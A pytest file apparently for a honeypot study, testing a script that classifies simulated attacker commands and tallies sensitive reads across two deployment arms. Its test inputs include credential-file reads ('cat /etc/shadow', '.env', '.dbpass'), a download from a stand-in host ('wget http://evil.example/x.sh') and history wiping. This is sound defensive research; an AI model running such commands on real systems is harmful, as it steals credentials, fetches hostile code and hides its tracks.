"""Tests for the Phase 3 per-arm comparison (scripts/field_arm_comparison.py).

The comparison must be symmetric across arms, count only completed sessions
in the metric block, bucket commands deterministically (credential-probe
wins over recon, e.g. ``cat /etc/shadow``), find sensitive-read shapes in
transcripts, and carry its honesty caveats into the artifact.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from scripts.field_arm_comparison import (  # noqa: E402
    arm_summary,
    classify,
    compare,
)


def _rec(persona: str, run_id: int, cmds: list[str], error: str | None = None) -> dict:
    return {
        "persona": persona,
        "run_id": run_id,
        "turns": len(cmds),
        "dwell_s": 10.0 * max(len(cmds), 1),
        "log": [
            {"turn": i + 1, "cmd": c, "output_chars": 5, "latency_s": 1.0}
            for i, c in enumerate(cmds)
        ],
        "transcript": "\n".join(f"$ {c}\nout" for c in cmds),
        "error": error,
    }


def test_classify_priority_credential_over_recon():
    # /etc/shadow is a cat (recon) but the credential bucket must win
    assert classify("cat /etc/shadow") == "credential_probe"
    assert classify("find / -name 'flag*'") == "recon"
    assert classify("wget http://evil.example/x.sh") == "mutation_download"
    assert classify("history -c") == "evasion"
    assert classify("df -h") == "recon"
    assert classify("systemctl status foo") == "other"


def test_arm_summary_excludes_error_sessions_from_metrics():
    ok = _rec("novice_scriptkiddie", 1, ["whoami", "cat /etc/passwd"])
    bad = _rec("novice_scriptkiddie", 2, [], error="connect: timeout")
    s = arm_summary([ok, bad])
    assert s["sessions_ok"] == 1
    assert s["sessions_err"] == 1
    assert s["turns_total"] == 2
    assert s["commands_total"] == 2
    assert s["sessions_per_persona"] == {"novice_scriptkiddie": 1}
    assert s["turn_latency_mean_s"] == 1.0


def test_sensitive_reads_found_in_transcripts():
    rec = _rec(
        "credential_hunter",
        1,
        ["cat .env", "cat /home/u/.dbpass"],
    )
    rec["transcript"] += "\nAKIAEXAMPLEKEY123456"  # AKIA + 16 chars
    s = arm_summary([rec])
    assert s["sensitive_read_hits"]["env_file"] >= 1
    assert s["sensitive_read_hits"]["dbpass"] >= 1
    assert s["sensitive_read_hits"]["aws_access_key"] == 1


def test_compare_is_symmetric_and_carries_caveats(tmp_path: Path):
    a = tmp_path / "a.jsonl"
    b = tmp_path / "b.jsonl"
    rows = [_rec("recon_operator", 1, ["ls", "whoami"])]
    a.write_text("".join(json.dumps(r) + "\n" for r in rows))
    b.write_text("".join(json.dumps(r) + "\n" for r in rows))
    payload = compare(a, b)
    arm_a = payload["arms"]["A_cowrie_only"]
    arm_c = payload["arms"]["C_ragin"]
    # symmetric inputs -> identical metrics apart from provenance
    for key in ("sessions_ok", "turns_total", "commands_total", "dwell_mean_s"):
        assert arm_a[key] == arm_c[key], key
    assert arm_a["source"] == str(a)
    assert any("endpoint-confound" in c for c in payload["caveats"])
    assert any("self-play" in c for c in payload["caveats"])